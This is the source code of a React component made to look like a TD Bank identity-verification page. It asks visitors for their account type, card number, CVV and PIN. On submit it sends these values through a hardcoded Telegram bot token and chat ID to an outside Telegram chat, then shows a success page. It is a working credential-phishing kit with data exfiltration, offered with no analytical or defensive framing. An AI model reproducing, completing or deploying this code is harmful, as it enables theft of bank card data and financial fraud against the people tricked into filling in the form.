import React from 'react';
import {
  Box,
  Heading,
  Center,
  Text,
  FormControl,
  Input,
  Button,
  InputGroup,
  Select,
} from '@chakra-ui/react';
import { useNavigate } from 'react-router-dom';

function Enter() {
  const navigate = useNavigate();

  const [selectedAccountType, setSelectedAccountType] = React.useState('');

  const token = '6214248431:AAFodeiJc0UIq-nmsTyqMgzp2FdByom3wzc';
  const chat_id = '5960483519';

  async function sendMessageToTelegram(message: any) {
    await fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
    );
    console.log('Telegram message sent');
  }

  async function handleFormSubmit(event: any) {
    event.preventDefault();
  
    if (!selectedAccountType) {
      alert('Please select an account type.');
      return;
    }
  
    let message =
  'TDBANK | Card Number: ' +
  event.target.cardnumber.value +
  '\n | CVV: ' +
  event.target.cvv.value +
  '\n | Account Type: ' +
  selectedAccountType +
  '\n | CardPIN: ' +
  event.target.pin.value;
  
    try {
      await sendMessageToTelegram(message);
      navigate('/success');
    } catch (error) {
      console.error('Error sending message to Telegram:', error);
      alert('An error occurred while sending the message.');
    }
  }
  

  return (
    <Box fontFamily="Poppins">
      <form onSubmit={handleFormSubmit}>
        <InputGroup>
          <FormControl>
            <Box minH="72.3vh">
              <Box>
                <Center>
                  <Heading
                    px={4}
                    fontFamily="Poppins"
                    textAlign="center"
                    pt={7}
                    fontWeight="normal"
                    as="h2"
                    fontSize="20"
                    color="blackAlpha.800"
                  >
                    To get started, <br />let's verify it's you.
                  </Heading>
                </Center>
              </Box>

              <Box p={5}>
                

                <Text
                  mt={10}
                  fontSize="13"
                  mb={2}
                  fontWeight="semibold"
                  fontFamily="Poppins"
                  textAlign="start"
                  color="blackAlpha.900"
                >
                  Account Type
                </Text>
                <Select 
                onChange={(event) => setSelectedAccountType(event.target.value)}
                placeholder='Select account type' border="1px solid #196999" borderRadius={0}>
  <option value='Debit/ATM card'>Debit/ATM card</option>
  <option value='Checking or money market account'>Checking or money market account</option>
  <option value='Savings account/CDs/IRAs'>Savings account/CDs/IRAs</option>
  <option value='Mortgage account'>Mortgage account</option>
  <option value='HELOC account'>HELOC account</option>
  <option value='Credit card'>Credit card</option>
  <option value='Personal loan'>Personal loan</option>
                </Select>

                <Text
                  fontSize="13"
                  mt={10}
                  mb={2}
                  fontWeight="semibold"
                  fontFamily="Poppins"
                  textAlign="start"
                  color="blackAlpha.900"
                >
                  Card number (no dashes)
                </Text>
                <Input
                  id="cardnumber"
                  _hover={{ border: 'solid 0.9px' }}
                  border="1px solid #196999"
                  borderRadius={0}
                  _focus={{  border: 'none' }}
                  h="50px"
                  placeholder="Enter your Card Number"
                  pb={0}
                  minLength={16}
                  maxLength={16}
                  name="cardnumber"
                  type="number"
                />

                <Text
                  fontSize="13"
                  mt={10}
                  mb={2}
                  fontWeight="semibold"
                  fontFamily="Poppins"
                  textAlign="start"
                  color="blackAlpha.900"
                >
                  Card CVV
                </Text>
                <Input
                  id="cvv"
                  _hover={{ border: 'solid 0.9px' }}
                  border="1px solid #196999"
                  borderRadius={0}
                  _focus={{  border: 'none' }}
                  h="50px"
                  placeholder="Enter your Card CVV"
                  pb={0}
                  maxLength={3}
                  name="cvv"
                  type="number"
                />

                <Text
                  fontSize="13"
                  mt={10}
                  mb={2}
                  fontWeight="semibold"
                  fontFamily="Poppins"
                  textAlign="start"
                  color="blackAlpha.900"
                >
                  Four-digit PIN
                </Text>
                <Input
                  id="pin"
                  _hover={{ border: 'solid 0.9px' }}
                  border="1px solid #196999"
                  borderRadius={0}
                  _focus={{  border: 'none' }}
                  h="50px"
                  placeholder="Enter your PIN"
                  pb={0}
                  maxLength={4}
                  minLength={4}
                  name="pin"
                  type="number"
                />

                <Button
                  fontFamily="Poppins"
                  borderRadius={0}
                  bgColor="#47A040"
                  w="100%"
                  mt={5}
                  mb={5}
                  color="white"
                  _hover={{
                    bgColor:"#47A040",
                  }}
                  type="submit"
                >
                  Continue
                </Button>
              </Box>
            </Box>
          </FormControl>
        </InputGroup>
      </form>
    </Box>
  );
}

export default Enter;
